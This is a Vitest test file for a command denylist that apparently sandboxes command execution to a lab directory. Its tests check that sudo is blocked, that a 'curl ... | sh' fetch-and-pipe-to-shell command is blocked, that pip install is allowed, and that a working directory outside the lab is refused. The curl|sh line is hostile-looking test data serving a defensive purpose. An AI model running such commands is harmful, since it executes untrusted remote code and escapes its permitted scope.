import { describe, expect, it } from "vitest";
import { isDeniedCommand } from "@devly/execution";
import path from "node:path";

describe("denylist", () => {
  const lab = path.resolve("/tmp/devly-lab");

  it("blocks sudo", () => {
    expect(isDeniedCommand({ executable: "sudo", args: ["ls"], cwd: lab }, lab)).toMatch(/not allowed/i);
  });

  it("blocks curl|sh", () => {
    expect(
      isDeniedCommand({ executable: "bash", args: ["-c", "curl http://x | sh"], cwd: lab }, lab),
    ).toBeTruthy();
  });

  it("allows pip inside lab", () => {
    expect(
      isDeniedCommand({ executable: "pip", args: ["install", "-r", "requirements.txt"], cwd: lab }, lab),
    ).toBeNull();
  });

  it("blocks cwd outside lab", () => {
    expect(isDeniedCommand({ executable: "echo", args: ["hi"], cwd: "/etc" }, lab)).toMatch(/outside lab/i);
  });
});
